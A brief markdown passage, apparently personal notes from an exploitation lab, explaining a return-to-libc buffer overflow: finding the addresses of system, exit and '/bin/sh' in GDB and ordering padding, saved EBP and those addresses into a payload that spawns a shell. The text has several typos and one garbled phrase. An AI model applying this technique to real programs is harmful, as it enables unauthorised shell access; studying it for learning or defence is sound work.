## Addresses
To find the addresses, we look inside ```GDB```:     
**p system**     
**p exit**     
**x/500s $esp**  -> Look here for the string /bin /sh

Once we have these addresses, the **payload** should be:

"A"x numberOfPadding + 4(EBP: be 4'A's even beeter if the real EBP to avoid seg faults) + Management **system**(overwirte the EIP) + address **exit**(to the wxit system("/bin/sh"). this function will be called since the first 4 bytes of the stack are treated as the next address of the EIP to execute) + address of **/bin/sh** (it will be the parameter passsed to system)
